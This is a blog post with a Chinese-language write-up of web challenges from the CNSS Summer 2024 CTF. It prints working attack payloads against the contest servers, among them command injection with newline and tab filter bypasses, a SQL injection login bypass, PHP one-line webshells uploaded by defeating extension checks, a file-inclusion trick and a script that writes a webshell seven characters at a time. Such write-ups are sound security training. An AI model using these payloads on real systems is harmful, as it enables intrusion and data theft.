<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CNSS Summer 2024 WriteUp | HvAng's Nests</title><meta name="author" content="HvAng"><meta name="copyright" content="HvAng"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Web🦴 babyHTTP考点GET POST Cookie，HTTP基础知识  🙋🏼‍♀️ PHPinfo考点phpinfo() http:&#x2F;&#x2F;111.229.23.244:50002&#x2F;phpinfo.phpctrl+f，搜索cnss 🥇 我得再快点利用正则表达式获取前端数据的Key的值，进行md5加密，再Python访问payload import requestsimport ref">
<meta property="og:type" content="article">
<meta property="og:title" content="CNSS Summer 2024 WriteUp">
<meta property="og:url" content="https://hvang10.github.io/2024/09/07/CNSS-Summer-2024-WriteUp/index.html">
<meta property="og:site_name" content="HvAng&#39;s Nests">
<meta property="og:description" content="Web🦴 babyHTTP考点GET POST Cookie，HTTP基础知识  🙋🏼‍♀️ PHPinfo考点phpinfo() http:&#x2F;&#x2F;111.229.23.244:50002&#x2F;phpinfo.phpctrl+f，搜索cnss 🥇 我得再快点利用正则表达式获取前端数据的Key的值，进行md5加密，再Python访问payload import requestsimport ref">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hvang10.github.io/img/favicon.png">
<meta property="article:published_time" content="2024-09-07T13:50:47.000Z">
<meta property="article:modified_time" content="2025-03-21T02:52:04.683Z">
<meta property="article:author" content="HvAng">
<meta property="article:tag" content="Web-learn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hvang10.github.io/img/favicon.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://hvang10.github.io/2024/09/07/CNSS-Summer-2024-WriteUp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CNSS Summer 2024 WriteUp',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-03-21 10:52:04'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="HvAng's Nests" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://picx.zhimg.com/80/v2-58d0f84fe61e154aa6095a9cbe2b1b7a_1440w.jpeg')"><nav id="nav"><span id="blog-info"><a href="/" title="HvAng's Nests"><span class="site-name">HvAng's Nests</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CNSS Summer 2024 WriteUp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-09-07T13:50:47.000Z" title="Created 2024-09-07 21:50:47">2024-09-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-03-21T02:52:04.683Z" title="Updated 2025-03-21 10:52:04">2025-03-21</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">10k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>53mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CNSS Summer 2024 WriteUp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="🦴-babyHTTP"><a href="#🦴-babyHTTP" class="headerlink" title="🦴 babyHTTP"></a>🦴 babyHTTP</h2><p>考点<code>GET POST Cookie</code>，<code>HTTP基础知识</code></p>
<p><img src="https://picx.zhimg.com/80/v2-3f2ab642ac73aab5f8fe835442e3aa66_1440w.png" alt=""></p>
<h2 id="🙋🏼‍♀️-PHPinfo"><a href="#🙋🏼‍♀️-PHPinfo" class="headerlink" title="🙋🏼‍♀️ PHPinfo"></a>🙋🏼‍♀️ PHPinfo</h2><p>考点<code>phpinfo()</code></p>
<p><code>http://111.229.23.244:50002/phpinfo.php</code><br><code>ctrl+f</code>，搜索<code>cnss</code></p>
<h2 id="🥇-我得再快点"><a href="#🥇-我得再快点" class="headerlink" title="🥇 我得再快点"></a>🥇 我得再快点</h2><p>利用正则表达式获取前端数据的<code>Key</code>的值，进行<code>md5</code>加密，再<code>Python</code>访问<code>payload</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">url = <span class="string">&#x27;http://152.136.11.155:10103&#x27;</span></span><br><span class="line"><span class="comment"># 循环获取页面内容</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    response = requests.get(url, timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 使用正则表达式匹配Key后面的字符串</span></span><br><span class="line">    pattern = <span class="string">r&#x27;Key : (\w+)&#x27;</span></span><br><span class="line">    <span class="comment"># 搜索匹配的字符串</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, response.text)</span><br><span class="line">    s = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">str</span> = md5(s.encode()).hexdigest()</span><br><span class="line">    url = <span class="string">f&#x27;http://152.136.11.155:10103/check?value=<span class="subst">&#123;<span class="built_in">str</span>&#125;</span>&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    res = requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>考点<code>编写数据提取的脚本能力？</code></p>
<h2 id="🏓-Ping"><a href="#🏓-Ping" class="headerlink" title="🏓 Ping"></a>🏓 Ping</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123; </span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>]; </span><br><span class="line">    <span class="variable">$ping_result</span> = <span class="title function_ invoke__">ping</span>(<span class="variable">$ip</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">nl2br</span>(<span class="variable">$ping_result</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
<p>应该是过滤了某些命令拼接符<code>;|</code>等，换行符<code>%0a</code>绕过，然后是空格绕过<code>%09</code><br><code>post: ip=127.0.0.1%0acat%09/f*</code></p>
<p>考点<code>127.0.0.1 %0a ls %09 cat *</code></p>
<h2 id="🐶-CNSS娘の宠物商店"><a href="#🐶-CNSS娘の宠物商店" class="headerlink" title="🐶 CNSS娘の宠物商店"></a>🐶 CNSS娘の宠物商店</h2><p>先试试万能密码<br><code>admin  ，  1&#39;or&#39;1&#39;=&#39;1</code></p>
<p>考点<code>简单的SQL注入</code></p>
<h2 id="🎮-2048"><a href="#🎮-2048" class="headerlink" title="🎮 2048"></a>🎮 2048</h2><p>无法使用<code>bp</code>抓包(目的也是为了修改分数)</p>
<p>查看<code>js</code>文件，发现<code>F12</code>被禁用，点击<code>Flag</code>按钮再<code>F12</code></p>
<p>发现没有<code>flag</code>相关信息(特殊编码之类的)，我觉得可以修改<code>js</code>文件里的<code>score</code>的加分规则，火狐修改不了，但谷歌浏览器应该可以(暂未试验)，或者把网页下载下来再修改</p>
<p>使用到了控制台<br><img src="https://pic1.zhimg.com/80/v2-69c1d329ccb815b861cd1181f95d1828_1440w.png" alt=""><br>此时分数已经被修改成功</p>
<p>考点<code>简单的js小游戏</code></p>
<h2 id="👤-换个头像先"><a href="#👤-换个头像先" class="headerlink" title="👤 换个头像先"></a>👤 换个头像先</h2><p>经典老题，前端检验文件后缀<br><code>1.png</code>，内容为<code>&lt;?php eval($_GET[&#39;1&#39;]);?&gt;</code></p>
<p><code>bp</code>抓包，改为<code>1.php</code></p>
<p>然后在网络中找到上传路径访问<br><code>http://152.136.11.155:10107/avatars/a799bfa76e49bb0e43190454ff941710/1.php?1=system(&quot;cat /flag&quot;);</code></p>
<p><code>cnss&#123;D4ng3r0us_Fl13_UpI0ad!&#125;</code><br>考点<code>抓包绕过前端检验</code></p>
<p>PS: 如上次<code>NewStarCTF2023</code>一样，命令没有反应，怎么办呢？换一个浏览器。。。纯坑爹</p>
<h2 id="🚓-can-can-need-shell"><a href="#🚓-can-can-need-shell" class="headerlink" title="🚓 can can need shell"></a>🚓 can can need shell</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 检查是否有文件上传</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="variable">$uploadedFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>];</span><br><span class="line">    <span class="comment">// 获取上传文件的名称</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]; </span><br><span class="line">    <span class="comment">// 获取文件扩展名</span></span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>, PATHINFO_EXTENSION);</span><br><span class="line">    <span class="comment">// 检查文件大小</span></span><br><span class="line">    <span class="variable">$maxSize</span> = <span class="number">102400</span>; <span class="comment">// 以字节为单位的最大文件大小</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="variable">$maxSize</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;文件大小超出限制！&#x27;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// 允许的文件扩展名</span></span><br><span class="line">    <span class="variable">$allowedExtensions</span> = [ <span class="string">&#x27;txt&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;php&#x27;</span>];</span><br><span class="line">    <span class="comment">// 检查文件扩展名是否被允许</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$ext</span>), <span class="variable">$allowedExtensions</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;不允许的文件类型！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 防火防盗防黑客</span></span><br><span class="line">    <span class="variable">$checkExtensions</span> = [<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;php3&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$ext</span>), <span class="variable">$checkExtensions</span>)) &#123;</span><br><span class="line">        <span class="variable">$dangerous</span> = <span class="keyword">array</span>(<span class="string">&#x27;eval&#x27;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;+&quot;</span>,<span class="string">&quot;|&quot;</span>,<span class="string">&quot;url&quot;</span>,<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;@&quot;</span>,<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>);</span><br><span class="line">        <span class="variable">$handle</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$uploadedFile</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="keyword">while</span> ((<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$handle</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$dangerous</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">                <span class="variable">$res</span> = <span class="title function_ invoke__">stristr</span>(<span class="variable">$line</span>,<span class="variable">$value</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$res</span> != <span class="literal">false</span>)&#123;</span><br><span class="line">                    <span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;防黑客&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// 检查文件上传过程中是否有错误</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] !== UPLOAD_ERR_OK) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;文件上传出错！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 移动文件到指定目录</span></span><br><span class="line">    <span class="variable">$uploadDir</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;CNSS&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]) . <span class="string">&quot;/&quot;</span>;</span><br><span class="line">    <span class="comment">// 检查目录是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) &#123;</span><br><span class="line">        <span class="comment">// 目录不存在，创建目录</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDir</span>, <span class="number">0755</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;目录创建成功&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;出错啦！&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$randomNumber</span> = <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>, <span class="number">10000</span>);</span><br><span class="line">    <span class="comment">//随机一个文件名</span></span><br><span class="line">    <span class="variable">$uploadPath</span> = <span class="variable">$uploadDir</span>  . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;CNSS&quot;</span>. <span class="variable">$randomNumber</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>)) . <span class="string">&quot;.&quot;</span> . <span class="variable">$ext</span> ;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$uploadPath</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;文件上传成功，路径如下： &#x27;</span>. <span class="variable">$uploadPath</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;文件上传失败！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">谁TM一开始跟我说的条件竞争。。。。</span><br><span class="line">他允许后缀[ <span class="string">&#x27;txt&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;php&#x27;</span>]</span><br><span class="line">同时对[<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;php3&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>]这些后缀名的文件进行检测，黑名单是<span class="string">&#x27;eval&#x27;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;+&quot;</span>,<span class="string">&quot;|&quot;</span>,<span class="string">&quot;url&quot;</span>,<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;@&quot;</span>,<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span></span><br><span class="line">这也不是条件竞争，我当时也没细看，就信了，然后我bp好像弄不了条件竞争，就下班不看了</span><br><span class="line">后面被某人cue了一下，之后平台关了，在自己vps上面搭建了一下环境</span><br><span class="line">思路如下，先上传一个png文件，这里没有任何检测，里面是命令执行&lt;?php system(<span class="string">&quot;cat /flag&quot;</span>);?&gt;</span><br><span class="line">然后上传php文件，include和引号没有被过滤，用于包含我们的png文件</span><br><span class="line">&lt;?php include <span class="string">&quot;/var/www/html/uploads/54f29efe821e25c44ac9858175a8af1f/7a91379285d4e81fb90af4c944ca289f.png&quot;</span>;?&gt;</span><br><span class="line">然后，访问返回的php文件路径即可</span><br><span class="line">文件上传脚本</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- action的链接，是当前题目的上传文件的链接--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;vps&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;uploaded_file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>考点，<code>代码审计+文件包含</code></p>
<h2 id="7️⃣-EZRCCCCE"><a href="#7️⃣-EZRCCCCE" class="headerlink" title="7️⃣ EZRCCCCE"></a>7️⃣ EZRCCCCE</h2><p>简单的7字符拼接，<a target="_blank" rel="noopener" href="https://blog.csdn.net/nzjdsds/article/details/102873187">https://blog.csdn.net/nzjdsds/article/details/102873187</a><br><code>payload.txt</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;7\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line"><span class="built_in">ls</span> -t&gt;0</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://152.136.11.155:10109/?6=&#123;0&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\27920\\Desktop\\cnss\\web\payload.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]&quot;</span> + url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line">        requests.get(url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查是否攻击成功</span></span><br><span class="line">test = requests.get(<span class="string">&quot;http://152.136.11.155:10109/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>最终<code>payload</code>，<code>http://152.136.11.155:10109/1.php?1=system(&quot;cat /flag&quot;);</code></p>
<p><code>cnss&#123;y0u_Rea11y_kn0w_h0w_7o_k22p_fit&#125;</code><br>考点<code>拼接字符串写入一句话</code><br>其实有反弹<code>shell</code>版，但<code>bash</code>被ban，<code>nc</code>的搞了一下没啥反应</p>
